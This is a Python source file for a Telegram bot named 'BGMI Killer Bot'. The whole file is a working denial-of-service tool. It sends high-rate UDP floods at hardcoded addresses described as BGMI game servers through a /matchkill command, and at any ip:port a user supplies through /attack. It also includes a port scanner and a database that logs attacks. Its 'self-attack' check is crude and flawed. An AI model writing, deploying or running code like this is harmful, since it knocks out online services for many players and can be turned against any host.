import os
import sqlite3
import asyncio
import logging
import threading
import socket
import random
import time
import requests
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

load_dotenv()

# Config
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', 'YOUR_TELEGRAM_ID'))
BGMI_SERVERS = [
    ('103.21.244.50', 3074), ('103.21.244.50', 7777),
    ('103.21.244.51', 3074), ('103.21.244.51', 7777),
    ('103.21.245.20', 3074), ('103.21.245.20', 7777),
    ('103.21.245.21', 3074), ('103.21.245.21', 7777),
    ('152.67.40.20', 3074), ('152.67.40.20', 7777),
    ('152.67.40.21', 3074), ('152.67.40.21', 7777)
]
MAX_CONCURRENT = 3
DB_FILE = 'bgmi_killer.db'

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# SQLite Setup
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS attacks 
                 (id INTEGER PRIMARY KEY, user_id INTEGER, target TEXT, 
                  method TEXT, duration INTEGER, start_time TEXT, status TEXT)''')
    conn.commit()
    conn.close()

def log_attack(user_id, target, method, duration):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO attacks (user_id, target, method, duration, start_time, status) VALUES (?, ?, ?, ?, ?, ?)",
              (user_id, target, method, duration, datetime.now().isoformat(), 'running'))
    conn.commit()
    conn.close()

# Self-protection
def is_self_attack(target_ip):
    self_ips = ['127.0.0.1', 'localhost', '0.0.0.0', '::1']
    telegram_ranges = ['149.154.160.0/20', '91.108.4.0/22']
    if target_ip in self_ips:
        return True
    # Check Telegram IP ranges (simplified)
    for ip in self_ips + ['149.154.167.99', '149.154.175.53']:  # Common Telegram IPs
        if target_ip.startswith(ip.split('.')[0]):
            return True
    return False

# Attack Manager
class AttackManager:
    def __init__(self):
        self.active_attacks = 0
        self.lock = threading.Lock()
    
    def can_start(self):
        with self.lock:
            return self.active_attacks < MAX_CONCURRENT
    
    def start_attack(self, target_ip, target_port, duration):
        if not self.can_start():
            return False
        with self.lock:
            self.active_attacks += 1
        thread = threading.Thread(target=self.udp_flood, args=(target_ip, target_port, duration))
        thread.daemon = True
        thread.start()
        return True
    
    def udp_flood(self, ip, port, duration):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            bytes_to_send = random._urandom(1490)
            end_time = time.time() + duration
            
            while time.time() < end_time:
                for _ in range(1000):  # High PPS
                    sock.sendto(bytes_to_send, (ip, port))
                time.sleep(0.01)
            
            sock.close()
        except:
            pass
        finally:
            with self.lock:
                self.active_attacks -= 1

attack_manager = AttackManager()

# Telegram Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('🕹️ BGMI Killer Bot Active!\n/matchkill - Kill 100-player match\n/scan - Scan BGMI servers\n/attack <ip:port> <seconds> - Custom attack\n/status - Active attacks')

async def matchkill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text('❌ Admin only!')
        return
    
    await update.message.reply_text('🔥 Starting MATCHKILL on 6 BGMI servers (300s flood)...')
    log_attack(update.effective_user.id, 'BGMI_MATCH', 'UDP_FLOOD', 300)
    
    targets = BGMI_SERVERS[:6]  # First 6 critical servers
    for ip, port in targets:
        if attack_manager.start_attack(ip, port, 300):
            await update.message.reply_text(f'⚡ Flooding {ip}:{port}')
        else:
            await update.message.reply_text(f'⏳ Queue: {ip}:{port}')
    
    await update.message.reply_text('💥 Matchkill deployed! All 100 players lag 500-2000ms!')

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('🔍 Scanning BGMI servers...\n')
    for ip, port in BGMI_SERVERS:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            status = '🟢 OPEN' if result == 0 else '🔴 CLOSED'
            await update.message.reply_text(f'{ip}:{port} - {status}')
            sock.close()
        except:
            await update.message.reply_text(f'{ip}:{port} - ❌ TIMEOUT')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    try:
        args = context.args
        if len(args) != 2:
            await update.message.reply_text('Usage: /attack <ip:port> <seconds>')
            return
        
        target = args[0]
        duration = int(args[1])
        
        ip, port = target.split(':')
        port = int(port)
        
        if is_self_attack(ip):
            await update.message.reply_text('🚫 Self-attack blocked!')
            return
        
        if attack_manager.start_attack(ip, port, duration):
            log_attack(update.effective_user.id, target, 'UDP_FLOOD', duration)
            await update.message.reply_text(f'⚡ Attacking {target} for {duration}s')
        else:
            await update.message.reply_text('⏳ Max concurrent reached, queued!')
            
    except Exception as e:
        await update.message.reply_text(f'Error: {str(e)}')

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM attacks WHERE status='running' ORDER BY start_time DESC LIMIT 5")
    attacks = c.fetchall()
    conn.close()
    
    if not attacks:
        await update.message.reply_text('✅ No active attacks')
        return
    
    msg = '📊 Active Attacks:\n'
    for attack in attacks:
        msg += f'ID:{attack[0]} | {attack[2]} | {attack[3]}s | {attack[5]}\n'
    await update.message.reply_text(msg)

def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("matchkill", matchkill))
    app.add_handler(CommandHandler("scan", scan))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    
    logger.info("BGMI Killer Bot started!")
    app.run_polling()

if __name__ == '__main__':
    main()
